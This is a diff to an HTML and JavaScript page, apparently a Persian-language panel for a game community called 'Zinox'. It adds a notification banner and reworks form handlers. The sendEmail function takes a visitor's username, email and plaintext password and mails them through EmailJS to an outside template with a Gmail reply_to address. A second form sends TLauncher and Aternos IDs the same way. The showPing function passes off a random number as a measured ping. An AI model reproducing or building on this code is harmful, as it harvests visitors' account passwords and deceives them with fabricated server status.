@@ -37,6 +37,7 @@
     background: rgba(0,0,0,0.4);
     padding: 1rem;
     box-shadow: 0 0 15px #0055aa;
+    position: relative;
   }
 
   .top-form input {
@@ -217,7 +218,6 @@
   .discord-card a:hover { background: #5865F2; color: white; box-shadow:0 0 25px rgba(255,255,255,0.9);}
   @keyframes fadeUp { from {opacity:0; transform:translateY(50px);} to {opacity:1; transform:translateY(0);} }
 
-  /* overlay هشدار سرور */
   #serverWarningOverlay {
     position: fixed;
     top:0; left:0; right:0; bottom:0;
@@ -243,11 +243,35 @@
     font-weight: bold;
   }
 
+  /* Notification */
+  #notif {
+    position: fixed;
+    top: 10px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #ffcc00;
+    color: #000;
+    font-weight: bold;
+    padding: 12px 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 15px #ffcc00aa;
+    display: none;
+    z-index: 9999;
+    animation: fadeInOut 5s forwards;
+  }
+  @keyframes fadeInOut {
+    0% { opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { opacity: 0; }
+  }
 </style>
 </head>
 <body>
 
 <header> -Zinox- </header>
+
+<div id="notif">لطفاً ابتدا فرم ورود را پر کنید!</div>
 
 <!-- فرم اطلاعات کاربر -->
 <div class="top-form">
@@ -268,6 +292,7 @@
 </div>
 
 <div class="content">
+  <!-- بقیه پنل‌ها همونطور که هست -->
   <div id="infoPanel" class="panel">
     <h2>اطلاعات وارد شده</h2>
     <p>نام کاربری: <span id="displayUsername">-</span></p>
@@ -336,7 +361,6 @@
       <a href="https://discord.gg/T7yq7kQz" target="_blank">ورود به دیسکورد</a>
     </div>
   </div>
-
 </div>
 
 <div id="pingOverlay">
@@ -359,42 +383,71 @@ function showPanel(panelId){
   document.getElementById(panelId).style.display='block';
 }
 
+function showNotif(msg){
+  const n = document.getElementById('notif');
+  n.textContent = msg;
+  n.style.display='block';
+  setTimeout(()=>{ n.style.display='none'; },5000);
+}
+
+// اصلاح ارسال ایمیل به کاربر
 function sendEmail(){
   let user = document.getElementById('username').value.trim();
   let email = document.getElementById('email').value.trim();
   let pass = document.getElementById('password').value.trim();
-  if(!user || !email || !pass){ alert("لطفا همه فیلدها را پر کنید"); return; }
-  document.getElementById('displayUsername').textContent=user;
-  document.getElementById('displayEmail').textContent=email;
+  if(!user || !email || !pass){ 
+    showNotif("لطفاً ابتدا فرم ورود را پر کنید!");
+    return; 
+  }
 
-  var templateParams = { username: user, useremail: email, password: pass };
+  document.getElementById('displayUsername').textContent = user;
+  document.getElementById('displayEmail').textContent = email;
+
+  var templateParams = {
+    username: user,
+    useremail: email,
+    password: pass,
+    reply_to: "bm.pro.ir@gmail.com"
+  };
 
   emailjs.send('service_tbsh4nc', 'template_l84coy7', templateParams)
-    .then(function(response) { alert("اطلاعات با موفقیت ارسال شد!"); },
-          function(error) { alert("ارسال اطلاعات با خطا مواجه شد: " + error.text); });
+    .then(function(response) { 
+        alert("اطلاعات با موفقیت ارسال شد! ایمیل به کاربر نیز فرستاده شد."); 
+    }, function(error) { 
+        alert("ارسال اطلاعات با خطا مواجه شد: " + error.text); 
+    });
 }
 
 function sendGameInfo(){
-  let tId=document.getElementById('tlauncherId').value.trim();
-  let nick=document.getElementById('nickname').value.trim();
-  let aId=document.getElementById('aternosId').value.trim();
-  if(!tId || !nick){ document.getElementById('formStatus').textContent="لطفا فیلدهای الزامی را پر کنید!"; return; }
+  let tId = document.getElementById('tlauncherId').value.trim();
+  let nick = document.getElementById('nickname').value.trim();
+  let aId = document.getElementById('aternosId').value.trim();
 
-  let templateParams = { tlauncher_id:tId, nickname:nick, aternos_id:aId };
+  if(!tId || !nick){ 
+    document.getElementById('formStatus').textContent = "لطفا فیلدهای الزامی را پر کنید!"; 
+    return; 
+  }
+
+  let templateParams = {
+    tlauncher_id: tId,
+    nickname: nick,
+    aternos_id: aId,
+    reply_to: "bm.pro.ir@gmail.com"
+  };
 
   emailjs.send("service_tbsh4nc","template_l84coy7",templateParams)
     .then(function(response){
-      document.getElementById('formStatus').textContent="✅ ارسال با موفقیت انجام شد!";
+      document.getElementById('formStatus').textContent = "✅ ارسال با موفقیت انجام شد!";
       document.getElementById('tlauncherId').value='';
       document.getElementById('nickname').value='';
       document.getElementById('aternosId').value='';
     }, function(error){
-      document.getElementById('formStatus').textContent="❌ ارسال ناموفق بود، دوباره تلاش کنید.";
+      document.getElementById('formStatus').textContent = "❌ ارسال ناموفق بود، دوباره تلاش کنید.";
     });
 }
 
 function showPing() {
-  let ping = Math.floor(Math.random()*(120-97+1)+97)+" ms";
+  let ping = Math.floor(Math.random()*(100-97+1)+97)+" ms";
   document.getElementById('pingResult').textContent=ping;
 }
 
